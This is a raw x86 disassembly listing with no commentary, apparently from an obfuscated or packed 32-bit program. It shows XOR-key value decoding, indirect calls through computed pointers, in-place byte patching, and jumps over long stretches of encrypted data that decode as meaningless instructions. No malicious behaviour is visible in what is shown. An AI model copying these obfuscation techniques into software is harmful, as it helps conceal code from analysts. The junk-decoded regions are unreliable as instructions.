  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	sub    BYTE PTR [esi],dl
  415960:	and    edx,ecx
  415962:	ins    DWORD PTR es:[edi],dx
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x4159ac
  41596b:	mov    edx,DWORD PTR [esi-0x24bf0677]
  415971:	xchg   ebp,eax
  415972:	mov    WORD PTR [eax+0x6d],ds
  415975:	dec    ebp
  415976:	xor    DWORD PTR [ecx+0x74],eax
  415979:	sub    DWORD PTR [esp+ebp*1+0xe],ecx
  41597d:	cmp    al,0xdd
  41597f:	aaa    
  415980:	push   ebx
  415981:	inc    eax
  415982:	clc    
  415983:	mov    DWORD PTR [esi+0x6],esi
  415986:	mov    esi,0xca10774e
  41598b:	mov    dh,0xbd
  41598d:	aad    0x9
  41598f:	adc    DWORD PTR ds:0x113af850,edx
  415995:	cli    
  415996:	shr    BYTE PTR [edi+0x43917c06],cl
  41599c:	test   eax,0x8da50b71
  4159a1:	pop    ebx
  4159a2:	arpl   WORD PTR [edx-0x6b4d9163],si
  4159a8:	mov    al,ds:0xbb36869e
  4159ad:	cmp    al,BYTE PTR [esi]
  4159af:	sbb    eax,0xe25b610d
  4159b4:	gs push ebp
  4159b6:	jmp    0xa7525bdf
  4159bb:	cli    
  4159bc:	shl    DWORD PTR [ecx+0x2e],cl
  4159bf:	loope  0x415a36
  4159c1:	mov    esp,0x91dfc9dc
  4159c6:	and    ebp,DWORD PTR [esi+0x363f6393]
  4159cc:	ins    BYTE PTR es:[edi],dx
  4159cd:	and    BYTE PTR [edx-0x195e8e91],ah
  4159d3:	mov    bh,ch
  4159d5:	loope  0x4159e2
  4159d7:	leave  
  4159d8:	imul   esp,DWORD PTR [eax],0xe15910e1
  4159de:	or     al,0xe0
  4159e0:	and    bh,BYTE PTR [ebx-0x197fb4f0]
  4159e6:	inc    ecx
  4159e7:	xchg   esp,eax
  4159e8:	push   ss
  4159e9:	jle    0x4159a2
  4159eb:	gs in  eax,dx
  4159ed:	cli    
  4159ee:	pop    es
  4159ef:	fbld   TBYTE PTR [esi]
  4159f1:	jge    0x415a2e
  4159f3:	push   edi
  4159f4:	push   ss
  4159f5:	dec    esi
  4159f6:	cmp    eax,0x368a4d74
  4159fb:	sar    ecx,0xfb
  4159fe:	pop    esp
  4159ff:	out    dx,eax
  415a00:	in     al,0x18
  415a02:	jo     0x4159be
  415a04:	ins    BYTE PTR es:[edi],dx
  415a05:	xchg   ecx,eax
  415a06:	int3   
  415a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a08:	stos   BYTE PTR es:[edi],al
  415a09:	mov    bh,0xc2
  415a0b:	outs   dx,DWORD PTR ds:[esi]
  415a0c:	jle    0x415a4f
  415a0e:	repnz or bl,BYTE PTR [bx-0x1121]
  415a14:	(bad)  
  415a15:	xor    BYTE PTR [edi-0x3],dh
  415a18:	scas   eax,DWORD PTR es:[edi]
  415a19:	(bad)  
  415a1a:	(bad)  
  415a1c:	aad    0x3
  415a1e:	mov    ebp,0xbee9db5b
  415a23:	sub    cl,BYTE PTR [eax]
  415a25:	arpl   WORD PTR [edx],bx
  415a27:	das    
  415a28:	inc    edi
  415a29:	fstp   DWORD PTR [eax]
  415a2b:	les    esp,FWORD PTR [ebp-0x71]
  415a2e:	arpl   di,cx
  415a30:	jo     0x415a8b
  415a32:	xchg   cl,al
  415a34:	mov    ecx,0x8a71d3e7
  415a39:	punpcklwd mm4,DWORD PTR [edi+0x5fc43f8c]
  415a40:	add    al,0x73
  415a42:	or     al,0x60
  415a44:	popf   
  415a45:	push   ss
  415a46:	test   eax,0xd761bac1
  415a4b:	ja     0x4159ff
  415a4d:	(bad)  
  415a4e:	jno    0x415ac9
  415a50:	inc    eax
  415a51:	dec    ecx
  415a52:	lods   eax,DWORD PTR ds:[esi]
  415a53:	jb     0x415ab3
  415a55:	popf   
  415a56:	bound  esp,QWORD PTR [edi]
  415a58:	sub    ah,ah
  415a5a:	aad    0xc4
  415a5c:	cli    
  415a5d:	add    BYTE PTR ds:0x190fbca3,bh
  415a63:	bound  ecx,QWORD PTR [bp+si+0x2359]
  415a68:	repz pop esi
  415a6a:	cmovo  edx,DWORD PTR ds:0x90c15ab0
  415a71:	ret    0x8193
  415a74:	gs ins BYTE PTR es:[edi],dx
  415a76:	jp     0x415a00
  415a78:	imul   esp,DWORD PTR [esi+eiz*8+0x120ac1c6],0xd38dc565
  415a83:	push   0xb107d15d
  415a88:	or     BYTE PTR [ecx-0x34b66ba5],dh
  415a8e:	loopne 0x415a2e
  415a90:	clc    
  415a91:	gs int3 
  415a93:	fdiv   QWORD PTR [ecx]
  415a95:	aam    0x80
  415a97:	mov    ebx,0x64b25ce6
  415a9c:	jae    0x415aaa
  415a9e:	icebp  
  415a9f:	shr    eax,0xd5
  415aa2:	push   edx
  415aa3:	imul   edi,DWORD PTR [esi+0x61],0x7f3a449c
  415aaa:	idiv   cl
  415aac:	cmp    ecx,esp
  415aae:	mov    esi,0xd5105b6
  415ab3:	sub    al,0xb9
  415ab5:	push   esi
  415ab6:	fs push ecx
  415ab8:	and    BYTE PTR [esi+edi*2],ch
  415abb:	pusha  
  415abc:	mov    ds:0x39fabb77,eax
  415ac1:	and    cl,BYTE PTR [ebx+0x38b13321]
  415ac7:	inc    ebx
  415ac8:	(bad)  
  415ac9:	cli    
  415aca:	mov    al,ds:0x96fa51ba
  415acf:	iret   
  415ad0:	or     ecx,DWORD PTR [ebx*4-0x29f70786]
  415ad7:	jg     0x415af8
  415ad9:	lahf   
  415ada:	jnp    0x415ada
  415adc:	bnd jne 0x415b59
  415adf:	sub    BYTE PTR [ebx-0x37],bl
  415ae2:	add    BYTE PTR [esi-0x7dcf5e71],0x7d
  415ae9:	pusha  
  415aea:	mov    bh,0x73
  415aec:	icebp  
  415aed:	pop    esp
  415aee:	cmp    DWORD PTR [ebx],edx
  415af0:	scas   eax,DWORD PTR es:[edi]
  415af1:	retf   
  415af2:	out    dx,eax
  415af3:	cwde   
  415af4:	push   0x580c7e05
  415af9:	imul   edi,DWORD PTR [ebx-0x5b475926],0x55055079
  415b03:	dec    esi
  415b04:	ds in  al,dx
  415b06:	nop
  415b07:	add    BYTE PTR [eax+0x6f3a0f1],bh
  415b0d:	addr16 mov ecx,0x5b1f1830
  415b13:	test   eax,0xf26b8538
  415b18:	xchg   ebx,eax
  415b19:	rcr    ebx,0xd6
  415b1c:	jg     0x415af5
  415b1e:	(bad)  [ecx-0x1e825900]
  415b24:	ins    DWORD PTR es:[edi],dx
  415b25:	ins    DWORD PTR es:[edi],dx
  415b26:	ret    0x40f
  415b29:	xor    bl,BYTE PTR [ecx]
  415b2b:	pop    es
  415b2c:	aas    
  415b2d:	adc    eax,0x911983b1
  415b32:	dec    ebp
  415b33:	mov    ebx,0x47448acb
  415b38:	frstor [esi]
  415b3a:	(bad)  
  415b3c:	aad    0xaf
  415b3e:	sbb    eax,0xc2ab1e42
  415b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b44:	clc    
  415b45:	stc    
  415b46:	dec    edi
  415b47:	sbb    BYTE PTR [ebp+esi*1-0x3c6543a6],bh
  415b4e:	pop    ss
  415b4f:	(bad)  [eax]
  415b51:	xor    DWORD PTR [esi-0x70226646],ebx
  415b57:	mov    ebx,0xf43c6f5b
  415b5c:	sbb    DWORD PTR [ecx],esp
  415b5e:	mov    ds:0x64c3db00,eax
  415b63:	cmp    DWORD PTR [edx],esi
  415b65:	push   esp
  415b66:	mov    ecx,0x4f9bb31b
  415b6b:	daa    
  415b6c:	test   al,0xfa
  415b6e:	jnp    0x415b18
  415b70:	push   ecx
  415b71:	mov    eax,0xe738ef32
  415b76:	stos   DWORD PTR es:[edi],eax
  415b77:	push   cs
  415b78:	inc    eax
  415b79:	ficomp DWORD PTR ds:[eax+0x12f593bc]
  415b80:	push   es
  415b81:	or     al,0x8a
  415b83:	mov    es,WORD PTR [eax]
  415b85:	jg     0x415b93
  415b87:	(bad)  
  415b89:	and    bh,al
  415b8b:	in     al,0xb3
  415b8d:	neg    DWORD PTR [edx]
  415b8f:	dec    ecx
  415b90:	sbb    eax,0x3c37c57d
  415b95:	mov    ecx,0x1a2a2d3
  415b9a:	cmp    DWORD PTR [ecx-0x3f],ebp
  415b9d:	je     0x415bcc
  415b9f:	arpl   WORD PTR [esi],di
  415ba1:	dec    ecx
  415ba2:	pushf  
  415ba3:	mov    edi,ebp
  415ba5:	mov    edi,0x41c2eacc
  415baa:	pop    es
  415bab:	cmp    al,0x7a
  415bad:	pop    ecx
  415bae:	jg     0x415c2e
  415bb0:	push   cs
  415bb1:	mov    bl,0x77
  415bb3:	cdq    
  415bb4:	push   es
  415bb5:	sbb    DWORD PTR [esp+ebp*8+0x778e5937],edx
  415bbc:	xchg   edi,eax
  415bbd:	or     dl,BYTE PTR [ebx]
  415bbf:	and    BYTE PTR [esi],cl
  415bc1:	xchg   ebx,eax
  415bc2:	push   DWORD PTR [edx+0x78]
  415bc5:	push   es
  415bc6:	jnp    0x415b68
  415bc8:	pushf  
  415bc9:	push   cs
  415bca:	pop    esp
  415bcb:	jmp    0xcc40:0x4f79de17
  415bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd3:	loop   0x415ba4
  415bd5:	or     DWORD PTR [ecx],ebx
  415bd7:	adc    ah,0x17
  415bda:	mov    ebx,0xb7075bb3
  415bdf:	hlt    
  415be0:	iret   
  415be1:	pop    ss
  415be2:	mov    ds:0x8e4a606d,al
  415be7:	mov    edi,0x9c0d03fe
  415bec:	fmul   QWORD PTR [edi+0x4c]
  415bef:	je     0x415c04
  415bf1:	aad    0x62
  415bf3:	in     al,0xcd
  415bf5:	adc    BYTE PTR [ebp+0x6d2387da],0x18
  415bfc:	enter  0x6cca,0x35
  415c00:	std    
  415c01:	dec    esi
  415c02:	inc    edx
  415c03:	sti    
  415c04:	hlt    
  415c05:	push   ecx
  415c06:	push   ecx
  415c07:	mov    DWORD PTR ds:0x42a7f5,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	es (bad) 
  415c41:	jmp    0x415c18
  415c43:	mov    dl,BYTE PTR ds:0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	ror    BYTE PTR [ebx-0x3a],0xe1
  415c4f:	rcr    DWORD PTR [esi-0x83f6b5f],0x23
  415c56:	cmp    BYTE PTR [edi+0x12],0xff
  415c5a:	hlt    
  415c5b:	jmp    0x415cb4
  415c5d:	dec    esp
  415c5e:	bound  eax,QWORD PTR [esi+0x34cb6fa7]
  415c64:	mov    ch,0xa7
  415c66:	sahf   
  415c67:	jno    0x415c09
  415c69:	and    al,0x48
  415c6b:	mov    dh,0x5d
  415c6d:	mov    ds:0x2fdb7eda,eax
  415c72:	(bad)  
  415c74:	test   BYTE PTR [ebx-0x10],0xaa
  415c78:	stos   DWORD PTR es:[edi],eax
  415c79:	or     ah,BYTE PTR [ebx-0x498f9fe1]
  415c7f:	push   esi
  415c80:	push   edi
  415c81:	gs enter 0x423f,0x21
  415c86:	popf   
  415c87:	and    DWORD PTR [eax],edi
  415c89:	mov    eax,ds:0x3aa28697
  415c8e:	pop    edx
  415c8f:	shl    BYTE PTR [edi],1
  415c91:	nop
  415c92:	mov    esi,0xc2558971
  415c97:	or     dl,BYTE PTR [edi+0x64]
  415c9a:	pop    esp
  415c9b:	inc    edx
  415c9c:	mov    ch,0xca
  415c9e:	mov    BYTE PTR [ecx+0xe691706],bh
  415ca4:	cwde   
  415ca5:	push   0x5
  415ca7:	push   ebx
  415ca8:	sub    edi,edi
  415caa:	mov    ds:0xbadb4024,eax
  415caf:	cmp    eax,0xb998b369
  415cb4:	inc    edi
  415cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cb6:	mov    esi,DWORD PTR [edi+0x78]
  415cb9:	or     dl,BYTE PTR [esi-0x1b]
  415cbc:	imul   edx,edx,0x743526c
  415cc2:	push   eax
  415cc3:	cmp    DWORD PTR [eax-0x65e7f67b],0xffffff8e
  415cca:	stc    
  415ccb:	sahf   
  415ccc:	xchg   BYTE PTR gs:[ebx-0x531a2681],al
  415cd3:	dec    edi
  415cd4:	ds push 0xffffffb5
  415cd7:	sub    eax,0x47ee16d4
  415cdc:	pushf  
  415cdd:	cmp    esp,edx
  415cdf:	test   eax,0x9f7d3a11
  415ce4:	(bad)  
  415ce5:	out    dx,al
  415ce6:	pop    edi
  415ce7:	into   
  415ce8:	fst    DWORD PTR [esi]
  415cea:	push   esp
  415ceb:	sub    DWORD PTR [ebx+eax*1+0x6ca3090a],eax
  415cf2:	sti    
  415cf3:	add    eax,0x8cb900d9
  415cf8:	mov    eax,ds:0x297bb60b
  415cfd:	mov    es,edx
  415cff:	dec    eax
  415d00:	fld    QWORD PTR [ecx+0xe89a13f]
  415d06:	daa    
  415d07:	sbb    bh,BYTE PTR [esi+0x4231c741]
  415d0d:	push   edx
  415d0e:	dec    esi
  415d0f:	cmp    eax,0x1c28278
  415d14:	xor    eax,esi
  415d16:	xor    BYTE PTR [ecx+0x7d150569],ch
  415d1c:	sti    
  415d1d:	das    
  415d1e:	aas    
  415d1f:	mov    ds,WORD PTR [ebp+0x508d5f78]
  415d25:	xor    ch,BYTE PTR [edi+ebx*2-0x77]
  415d29:	bound  ecx,QWORD PTR [ebx-0x688b8813]
  415d2f:	and    al,0xf9
  415d31:	sahf   
  415d32:	ss icebp 
  415d34:	not    DWORD PTR [ecx+edi*2]
  415d37:	cmp    DWORD PTR [edi],edx
  415d39:	rcl    DWORD PTR fs:[eax-0x555e89dc],cl
  415d40:	or     DWORD PTR [eax],edx
  415d42:	std    
  415d43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d44:	bound  eax,QWORD PTR [eax]
  415d46:	je     0x415db1
  415d48:	dec    ebx
  415d49:	adc    eax,0x412e5e17
  415d4e:	xor    eax,0xf58215e1
  415d53:	outs   dx,BYTE PTR ds:[esi]
  415d54:	call   0x77df:0x5243e935
  415d5b:	cmp    DWORD PTR [ebx-0x2a],edx
  415d5e:	leave  
  415d5f:	leave  
  415d60:	pop    es
  415d61:	push   ebx
  415d62:	inc    ebp
  415d63:	loop   0x415d5a
  415d65:	fs xchg ecx,eax
  415d67:	(bad)  
  415d68:	pop    ebx
  415d69:	outs   dx,DWORD PTR cs:[esi]
  415d6b:	adc    al,BYTE PTR [edx+0x56a1f330]
  415d71:	push   eax
  415d72:	out    dx,eax
  415d73:	or     ah,BYTE PTR [ebx-0x747ab521]
  415d79:	mov    ebx,DWORD PTR [eax-0x28]
  415d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d7d:	dec    edx
  415d7e:	retf   0x4b5f
  415d81:	rcr    edx,1
  415d83:	fs pop ss
  415d85:	lock pusha 
  415d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d88:	xor    DWORD PTR [edx+0x43],eax
  415d8b:	mov    eax,0x66f47936
  415d90:	stos   DWORD PTR es:[edi],eax
  415d91:	sub    esi,esp
  415d93:	test   eax,0x67acfe43
  415d98:	icebp  
  415d99:	pop    esp
  415d9a:	mov    cl,0x3e
  415d9c:	pop    es
  415d9d:	inc    edx
  415d9e:	repnz gs enter 0x7d8a,0xe3
  415da4:	sub    DWORD PTR [edi+0x3c],ebx
  415da7:	and    cl,BYTE PTR [esi]
  415da9:	sbb    DWORD PTR [eax],ebp
  415dab:	adc    edx,DWORD PTR [ebx+0x16]
  415dae:	cmp    esi,ebx
  415db0:	add    esp,eax
  415db2:	inc    esp
  415db3:	mov    al,0xf1
  415db5:	into   
  415db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415db7:	jmp    0xa854988f
  415dbc:	xchg   ebp,eax
  415dbd:	test   BYTE PTR [esi-0x57],bl
  415dc0:	daa    
  415dc1:	cli    
  415dc2:	push   ss
  415dc3:	icebp  
  415dc4:	lahf   
  415dc5:	push   edi
  415dc6:	jo     0x415dc3
  415dc8:	jg     0x415de9
  415dca:	test   ecx,esp
  415dcc:	popa   
  415dcd:	out    0x98,eax
  415dcf:	out    dx,al
  415dd0:	xor    al,BYTE PTR [edx-0x2c]
  415dd3:	xor    ebp,DWORD PTR [ebx+0x48]
  415dd6:	loopne 0x415e4c
  415dd8:	leave  
  415dd9:	sbb    ecx,DWORD PTR [eax+eiz*2-0x689329f1]
  415de0:	test   bp,di
  415de3:	mov    eax,ds:0xdbb44244
  415de8:	imul   ecx,DWORD PTR [ecx-0x191706ac],0x5bcc1937
  415df2:	add    BYTE PTR [eax],0xf2
  415df5:	mov    ebp,0xdd2c4297
  415dfa:	sub    BYTE PTR [ebx+0x1e],bh
  415dfd:	lea    esi,[eax-0x15]
  415e00:	cmp    DWORD PTR [eax],ecx
  415e02:	cs dec eax
  415e04:	in     al,dx
  415e05:	add    DWORD PTR cs:[eax+0x34012af2],ebp
  415e0c:	jge    0x415dc9
  415e0e:	sar    DWORD PTR [eax+0x58],0xda
  415e12:	pop    es
  415e13:	ins    BYTE PTR es:[edi],dx
  415e14:	loope  0x415dd7
  415e16:	call   0xf0b11f76
  415e1b:	sbb    edi,DWORD PTR [edx-0x26fb6db3]
  415e21:	call   0x2c771cc8
  415e26:	mov    edi,0x1647a484
  415e2b:	mov    esp,0x221f9d44
  415e30:	mov    eax,0xac9aa82e
  415e35:	pop    es
  415e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e37:	xor    eax,0xdc9f7d85
  415e3c:	adc    edx,ecx
  415e3e:	int3   
  415e3f:	in     eax,dx
  415e40:	or     ecx,DWORD PTR [edi+0x7a]
  415e43:	xor    ecx,DWORD PTR [eax]
  415e45:	inc    eax
  415e46:	adc    DWORD PTR [esp+ebx*4-0x70b7d390],esp
  415e4d:	add    al,0x57
  415e4f:	aam    0xb3
  415e51:	lods   eax,DWORD PTR ds:[esi]
  415e52:	mov    eax,0x1b737158
  415e57:	pop    ecx
  415e58:	push   esp
  415e59:	fdivr  st,st(5)
  415e5b:	jmp    0x57ec979d
  415e60:	sub    DWORD PTR [ecx],edi
  415e62:	sub    BYTE PTR [edi],0x85
  415e65:	or     cl,dl
  415e67:	mov    bh,0x2b
  415e69:	adc    eax,0x4928bc47
  415e6e:	cdq    
  415e6f:	mov    WORD PTR [ecx-0x35546e4f],gs
  415e75:	push   ds
  415e76:	adc    DWORD PTR [edi+0x4f],edi
  415e79:	test   BYTE PTR [edi+eax*1],ah
  415e7c:	xor    al,0xd7
  415e7e:	fnstsw WORD PTR [ebp-0x42]
  415e81:	jp     0x415eab
  415e83:	icebp  
  415e84:	mov    ebx,0x4dd5de59
  415e89:	sbb    al,0xbf
  415e8b:	mov    BYTE PTR ds:0x6a33f5ca,ch
  415e91:	iret   
  415e92:	dec    esp
  415e93:	lods   eax,DWORD PTR ds:[esi]
  415e94:	hlt    
  415e95:	xor    eax,0x9c883f19
  415e9a:	mov    cs,WORD PTR [ebp+0x575b1b69]
  415ea0:	sbb    DWORD PTR [esi+0x28],ebp
  415ea3:	add    bl,ch
  415ea5:	imul   eax,DWORD PTR [ebx],0x3b
  415ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ea9:	push   0x40
  415eab:	mov    ah,0x51
  415ead:	ror    BYTE PTR [ebx+0x272dac1a],0x24
  415eb4:	push   es
  415eb5:	xchg   ebx,eax
  415eb6:	iret   
  415eb7:	add    ebp,ebp
  415eb9:	jbe    0x415e8a
  415ebb:	std    
  415ebc:	mov    eax,0xd90607f1
  415ec1:	sub    edx,edi
  415ec3:	add    ecx,ebp
  415ec5:	int    0x66
  415ec7:	xchg   WORD PTR [eax+ebx*4-0x6d],si
  415ecc:	add    BYTE PTR [edx-0x2e],dl
  415ecf:	add    esp,DWORD PTR [edx]
  415ed1:	xchg   ah,bh
  415ed3:	sbb    BYTE PTR [ecx-0x3490e9d7],bl
  415ed9:	dec    esp
  415eda:	mov    dh,BYTE PTR [eax]
  415edc:	push   ebp
  415edd:	mov    ebx,0xf35d197a
  415ee2:	mov    ds:0x89a0e44f,eax
  415ee7:	inc    ebp
  415ee8:	clc    
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	cmp    al,cl
  415f4c:	mov    dl,0x3
  415f4e:	daa    
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415f91
  415f57:	ja     0x415f81
  415f59:	mov    ebx,DWORD PTR [edi]
  415f5b:	add    DWORD PTR [ebp-0x8b44941],edx
  415f61:	xchg   ebx,eax
  415f62:	stos   BYTE PTR es:[edi],al
  415f63:	ss mov bh,0x2d
  415f66:	retf   
  415f67:	mov    edx,DWORD PTR gs:[ecx+0x5c]
  415f6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f6c:	jmp    0xc56d:0x8fe3294b
  415f73:	xchg   ebx,eax
  415f74:	push   0xd
  415f76:	push   esp
  415f77:	jmp    0xd99a:0x97f4a081
  415f7e:	das    
  415f7f:	inc    esp
  415f80:	dec    eax
  415f81:	ja     0x415f1a
  415f83:	dec    edi
  415f84:	(bad)  
  415f86:	fs push cs
  415f88:	adc    dl,ch
  415f8a:	out    dx,eax
  415f8b:	imul   esp,DWORD PTR [esi+0x7b],0xffffff8d
  415f8f:	pop    ds
  415f90:	cmc    
  415f91:	xor    DWORD PTR [edx+0x49],0x547045de
  415f98:	mov    bl,dh
  415f9a:	pop    ss
  415f9b:	and    edx,edx
  415f9d:	add    bl,BYTE PTR [edx]
  415f9f:	das    
  415fa0:	int3   
  415fa1:	cli    
  415fa2:	fbstp  TBYTE PTR [edi+0x7d]
  415fa5:	mov    ds:0x9c25e2f4,eax
  415faa:	enter  0x9075,0xa8
  415fae:	xor    DWORD PTR [esi],0x6aac9056
  415fb4:	cdq    
  415fb5:	icebp  
  415fb6:	add    BYTE PTR [eax+esi*1-0x5f740c75],0x23
  415fbe:	retf   0x9df4
  415fc1:	push   eax
